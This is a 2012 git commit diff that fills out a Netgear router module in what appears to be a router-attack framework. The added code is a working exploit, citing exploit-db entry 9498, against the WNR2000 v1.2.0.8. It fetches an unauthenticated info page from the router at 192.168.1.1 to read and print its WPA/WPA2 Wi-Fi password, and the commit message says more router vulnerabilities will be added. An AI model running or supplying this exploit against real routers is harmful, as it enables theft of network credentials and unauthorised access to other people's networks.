fad836780ca11f1ec0cf783f5c3627df6ea8aff3
Bryan A <shodivine@gmail.com>
2012-10-02 23:33:49 -0500

    * modules/parameter/routers/*.py   -- Filled these out a bit.  I tried to get at least 1-2 vulnerabilities      for these routers, but will add to them over time.

--- modules/parameter/routers/netgear.py
+++ modules/parameter/routers/netgear.py
@@ -1,10 +1,30 @@
 import util
+import urllib
 
+#
+# Netgear router vulnerabilities
+#
+
+#
+# list of supported vulns
+#
 def vulnerabilities():
-	return []
+	return [ 'WNR2000 v1.2.0.8 - Read WPA/WPA2 Password'
+		   ]
 
+#
+# run given vuln
+#
 def run ( run ):
 	if run == 1:
-		tmp = vulnerabilities()[run-1]
-		print '[dbg] running ', tmp
-		return	
+		# http://www.exploit-db.com/exploits/9498/
+		print '[+] Running ', vulnerabilities()[0]
+		url = 'http://192.168.1.1:80/router-info.htm'
+		try:
+			response = urllib.urlopen(url)
+		except Exception, j:
+			print '[-] Error connecting to host: ', j
+			return
+		print response.read()
+	else:
+		return
